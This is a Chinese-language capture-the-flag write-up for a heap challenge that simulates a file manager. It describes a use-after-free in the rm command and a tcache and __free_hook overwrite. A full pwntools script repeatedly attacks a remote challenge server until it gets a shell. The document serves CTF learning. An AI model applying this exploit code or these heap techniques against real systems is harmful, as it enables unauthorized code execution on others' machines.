拿到题目初步了解一下题目信息，保护全开，程序是模拟一个文件管理器，实现了一些文件管理的命令。



ida打开逆向分析程序逻辑



分析dir 和 file 结构体大致如下:


struct dir{li    int type;//0为目录，1为文件    int no1;    struct dir *parent;//父目录    struct dir children[16];//子目录或文件    char *name;    char *data;    int size;    int no2;}


功能rm逻辑如下，当对象为目录时，unlink_node删除其父目录中对应指针，再free删除对象. 当对象为文件时, 先free data申请的堆，若删除文件在当前目录，会删除其父目录中的指针，若不在当前目录，仅释放data堆， 删除的data指针未清0，存在uaf漏洞。


主要利用方式为将已经释放的tcache块再次释放为unsort bin，利用uaf修改地址的后几位到free_hook附近，可利用tcache申请到free_hook附近地址

考虑三次重复利用获得3次free_hook附近地址，一次申请到free_hook前面一小段的地址，以该申请到的内存创建一个目录，第二次申请到free_hook的地址，以此地址作为一个文件的data段，使得可直接写free_hook，第三次申请到free_hook-8的地址，以该地址在第一次创建的目录下新建一个目录，会将父目录的地址写到free_hook位置，再写free_hook后几位修改为system地址，最后free内容为"/bin/sh"的堆拿到shell。

free_hook到system的距离小于0xffffff,  因此只需写libc地址的后3个字节即可，其中前面12位为随机的值，后面12位为定值，用一个确定的值跑每次能成功拿到shell的概率为1/4096,  看起来不算太小， 但受网速等因素影响始终跑不出shell，考虑利用其他办法进一步确定随机的libc地址。

程序cat功能无用，可打印的name字段需要满足以下要求才能正常打印，否则程序会结束。


现在需要确定的是地址倒数2,3 位的值，考虑通过释放unsort bin 填入libc地址，修改某一个目录或文件的name指向该堆地址+1，构造另一个文件data字段指向该堆地址+3，并写入'\x00'，通过ls 输出判断这个目录或文件名是否可以正常打印，每次请求能成功的概率约(66/256) *(66/256) ≈1/16


from pwn import *
def mkdir(p,name):    p.sendlineafter("$ ", "mkdir")    p.sendlineafter("name> ", name)def touch(p,name):    p.sendlineafter("$ ", "touch")    p.sendlineafter("filename> ", name)def rm(p,name):    p.sendlineafter("$ ", "rm")    p.sendlineafter("filename> ", name)def echo(p,data,name):    p.sendlineafter("$ ", "echo")    p.sendlineafter("arg> ", data)    p.sendlineafter("redirect?> ", "y")    p.sendlineafter("path> ", name)def cd(p,name):    p.sendlineafter("$ ","cd")    p.sendlineafter("path> ", name)def ls(p,path):    p.sendlineafter("$ ","ls")    p.sendlineafter("path> ", path)
def get_libc_heap(p, addr):    touch(p, "f1")    echo(p, "a"*0xa8, "f1")    mkdir(p, "d1")    cd(p, "d1")    for i in range(12):        touch(p, "d1_f" + str(i))    for i in range(6):        echo(p, '\r' + "a"* 0xa7, "d1_f" + str(i))    rm(p, "d1_f5")    rm(p, "../f1")    for i in range(5):        rm(p, "d1_f" + str(i))    rm(p, "../f1")    echo(p, addr, "../f1")    for i in range(6):        echo(p, "\r" + 'a' * 0xa7, "d1_f" + str(6+i))#清除tcache链表    cd(p, "../..")def get_addr(p):    mkdir(p, "d1")    touch(p,"f1")    touch(p, "f2")    echo(p,"a" *0xa8, "f1")    echo(p, "a\r"*0x500, "f2")    cd(p, "d1")    touch(p,"d1_f0")#防止释放堆合并到top chunk    rm(p, "../f1")    rm(p, "../f1")#double free        echo(p, "\xe3", "../f1")    rm(p,"../f2")    touch(p,"d1_f1")    echo(p, "\x00"+"\r"*0xa0, "d1_f1")    rm(p, "../f1")#重置tcache计数为0    echo(p, "\x00"*0x90+"\xe1", "../f1")#d1_f1 name字段指向了libc地址后2,3位    echo(p,"\r"*0xa8, "d1_f0")    ls(p,".")    while True:    #p = process("./chall")    p=remote("101.35.172.231","10000")    #context(log_level = "debug")    cd(p,"home")    get_addr(p)    p.recvuntil("d1_f0\n")    ret = p.recv(5)    if ret.find(b'exit') != -1:        p.close()        continue#libc后2,3位地址不满足name要求，程序退出，重新连接    else:        cd(p,"../..")#/        offset = u16(ret[:2])<<8        print(hex(offset))        #if offset +0x4f440 - 0x3ebc00 < 0:        #    p.close()        #    continue                   free_hook_of = (offset + 0x3ed8e8 - 0x3ebc00)&0xffffff        system_of = (offset +0x4f440 - 0x3ebc00)&0xffffff        print("free_hook:" + hex(free_hook_of))        print("system:" + hex(system_of))        mkdir(p, "test1")        cd(p, "test1")        get_libc_heap(p, p32(free_hook_of - 0xe8)[:-1])        mkdir(p, "free00")
        touch(p,"freee8")        mkdir(p,"test2")        cd(p, "test2")        get_libc_heap(p, p32(free_hook_of)[:-1])        echo(p, "\x00" *0xa8, "freee8")
        touch(p,"sh")        echo(p, "/bin/sh","sh")        mkdir(p, "test3")        cd(p, "test3")        get_libc_heap(p, p32(free_hook_of - 0x8)[:-1])        cd(p, "free00")        touch(p,"freee0")        echo(p, p32(system_of)[:-1], "../freee8")        rm(p,"../sh")        p.interactive()        break


运行脚本，一般连接20次左右可以拿到shell。



后来看了解题参考，发现做复杂了，没有想到echo中可以通过invalid path\n的输出来逐字节爆破libc地址，目录名为非法字符时只要不触发ls操作就不会结束程序，获取libc地址后只需要利用tcache分配到free_hook即可获取shell。
